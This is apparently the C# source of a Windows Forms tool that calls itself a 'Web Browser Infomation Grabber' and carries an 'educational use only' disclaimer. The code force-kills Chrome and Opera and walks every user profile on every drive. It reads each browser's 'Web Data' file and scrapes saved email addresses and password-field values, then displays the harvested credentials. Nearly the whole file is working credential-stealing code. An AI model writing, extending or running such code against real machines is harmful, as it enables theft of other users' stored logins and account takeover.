using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

namespace NHA_Browser_Info_Passing{
public partial class BrowserInfPassing : Form{
public BrowserInfPassing(){
InitializeComponent();
}

private void GetPasswordsFromChrome_Click(object sender, EventArgs e){
PrepAndDestroy();

}

void PrepAndDestroy(){
string[] ProcsToKill = "chrome~opera".Split('~');
KillProcessesByName(ProcsToKill);
for (;;){
if (Process.GetProcessesByName("chrome").Length <= 1 && Process.GetProcessesByName("opera").Length <= 1){
DoAccountFinding(); break;
}
}
}

void KillProcessesByName(object procname){
if(procname.GetType().ToString()=="System.String"){
foreach (Process PROC in Process.GetProcessesByName((string)procname)){
PROC.Kill();
}
}else if (procname.GetType().ToString()=="System.String[]"){
string[] prox = (string[])procname;
foreach(string proxn in prox){
foreach (Process PROC in Process.GetProcessesByName(proxn)){
PROC.Kill();
}
}
}
}


string[] GetUserPaths(){
List<string> paths = new List<string>();
foreach (string drive in Directory.GetLogicalDrives()){
if (Directory.Exists(drive+"Users")){
string path = drive + "Users";
string[] UserFolders = Directory.GetDirectories(path);
foreach(string User in UserFolders){
string UserName= User.Split('\\')[User.Split('\\').Length - 1];
if (Directory.Exists(User+"\\AppData")&&Directory.Exists(User+"\\Start Menu")&& UserName != "Default"&& UserName!="Default User"){
paths.Add(User);
}}
}
}
return paths.ToArray();
}


List<string> FindCromeLocos(){
List<string> Output=new List<string>();
foreach(string user in GetUserPaths()){
string temploco= user+@"\AppData\Local\Google\Chrome\User Data\Default";
string templocoopera= user+@"\AppData\Roaming\Opera Software\Opera Stable";
string templocooperaGX= user+ @"\AppData\Roaming\Opera Software\Opera GX Stable";
if (Directory.Exists(temploco) && File.Exists(temploco + "\\Web Data")){
Output.Add(temploco+"\\Web Data");
}
if(Directory.Exists(templocoopera) && File.Exists(templocoopera + "\\Web Data")){
Output.Add(templocoopera + "\\Web Data");
}
if(Directory.Exists(templocooperaGX) && File.Exists(templocooperaGX + "\\Web Data")){
Output.Add(templocooperaGX + "\\Web Data");
}
}
return Output;
}

string RepAllIfThere(string inputs,string whatto,string repwith) { string outs = inputs; if (outs.Contains(whatto)) { outs = outs.Replace(whatto, repwith); } return outs; }


List<string> countrycodes = new List<string>() {
"uk",
"au",
"us",
"co",
"nz"};
List<string> RetrieveDomains(){
List<string> Domains = new List<string>();
foreach(string EmailDomain in DomainList.EmailDomains){
Domains.Add(EmailDomain);
foreach(string countrycode in countrycodes){
Domains.Add(EmailDomain+"."+ countrycode);
}
}
return Domains;
}

string SplitAssistFromMailDomail(string cleaned){
string Reti=cleaned;
foreach(string domain in RetrieveDomains()){
if(cleaned.Split('@')[1].StartsWith(domain)){
Reti= cleaned.Split('@')[0]+"@"+domain;
}
}
return Reti;
}

string CleanDoublePasswordThing(string passin){string passout=passin;
string[] passinf = passout.Split();
bool ispossible=true;

var value = passout;
var firstHalfLength = (int)(value.Length / 2);
var secondHalfLength = value.Length - firstHalfLength;
var splitVals = new[] {
value.Substring(0, firstHalfLength),
value.Substring(firstHalfLength, secondHalfLength)
};

string possbuild = splitVals[0];
string possbuild2 = splitVals[1];
if(possbuild.ToLower()!=possbuild2.ToLower()){
ispossible=false;
}

if(ispossible){
passout=possbuild+"     Or     "+possbuild2;
}

return passout;
}


List<List<string>> EmailAndPasswordParser(List<string> CromeLocos){
List<string>  TempEmail=new List<string>();
List<string>  TempPass=new List<string>();
foreach (string TooReed in CromeLocos) {
string Read=File.ReadAllText(TooReed);
if(Read.Contains("{")){Read=Read.Replace("{","");}
if(Read.Contains("}")){Read=Read.Replace("}","");}
Read= RepAllIfThere(Read,"{", "");
Read= RepAllIfThere(Read,"}", "");
Read= RepAllIfThere(Read,")", "");
Read= RepAllIfThere(Read,"emailconfirm", ")");
Read= RepAllIfThere(Read,"email-input", ")");
Read= RepAllIfThere(Read,"email-addy", ")");
Read= RepAllIfThere(Read,"emailinput", ")");
Read= RepAllIfThere(Read,"emailaddy", ")");

if(Read.Contains("PasswordText")){
Read=Read.Replace("PasswordText","{");
string[] PassStore = Read.Split('{');
for(var i=1;i < PassStore.Length;i++){string Pass=PassStore[i];
string cleaned= Pass.Split(CharWhereToSplit(Pass))[0];
if(cleaned!=""&&cleaned.Length>1){
cleaned=CleanDoublePasswordThing(cleaned);
if(!TempPass.Contains(cleaned)){
TempPass.Add(cleaned);
}
}}

}



if(Read.Contains("email")){
Read=Read.Replace("email","}");
string[] MailStore = Read.Split('}');
for(var i=1;i < MailStore.Length;i++){string Mail= MailStore[i];
string cleaned= Mail.Split(CharWhereToSplitEmail(Mail))[0];
if(cleaned!=""&&cleaned.Length>1&&cleaned.Contains("@")){
char lastchar = cleaned.ToLower().Last();
if(lastchar!='o'&&lastchar!='m'&&lastchar!='k'){ 
cleaned = cleaned.TrimEnd(lastchar);
}
string meil=cleaned;
meil= SplitAssistFromMailDomail(cleaned.ToLower());
if (!TempEmail.Contains(meil.ToLower())){
TempEmail.Add(meil.ToLower());
}
}}
}
}


List<List<string>> Packed =new List<List<string>>() { TempEmail, TempPass };
return Packed;
}

List<string> AccountFillFromEmailAndPasswordDump(List<string> Emails ,List<string> Passwords){
List<string> AccountInfo = new List<string>();
AccountInfo.Add("");
AccountInfo.Add("Emails: ");
AccountInfo=AddStringArrayToListString(AccountInfo,Emails.ToArray());
AccountInfo.Add("");
AccountInfo.Add("Passwords: ");
AccountInfo=AddStringArrayToListString(AccountInfo,Passwords.ToArray());
return AccountInfo;
}

List<string> AddStringArrayToListString(List<string> InList,string[] InArray){
List<string> OutList=InList;
foreach(string info in InArray){
OutList.Add(info);
}
return OutList;
}


void DoAccountFinding(){
List<string> CromeLocos=new List<string>(FindCromeLocos());
List<List<string>> Passing = EmailAndPasswordParser(CromeLocos);
List<string> Emails=new List<string>(Passing[0]);
List<string> Passwords=new List<string>(Passing[1]);
List<string> AccountInfo = AccountFillFromEmailAndPasswordDump(Emails, Passwords);
InfoBox.Lines= AccountInfo.ToArray();
}



char CharWhereToSplit(string inputstring){ char rety = '~';
string lettice = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
for(var i=0;i<inputstring.Length;i++){
if(!lettice.Contains(inputstring[i])){
rety=inputstring[i];
break;
}
}
return rety;
}

char CharWhereToSplitEmail(string inputstring){ char rety = '~';
string lettice = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890@.-";
for(var i=0;i<inputstring.Length;i++){
if(!lettice.Contains(inputstring[i])){
rety=inputstring[i];
break;
}
}
return rety;
}



private void UserInfoPassing_Load(object sender, EventArgs e){
List<string> TextS = new List<string>() {"",
"{TESTING} Web Browser Infomation Grabber",
"                 Grabber Version: 1.1",
"               ~  Made By: dr NHA  ~",
"   For Educational And Research Use Only!","","Disclaimer:",
"               All Code Is Strictly Prohibited From Malware Use!",
"Credits Have To Be Given To The Creator If Anything Is Used In Any Way!" };
InfoBox.Lines= TextS.ToArray();
KnownDomains.Lines=RetrieveDomains().ToArray();
}


}
}
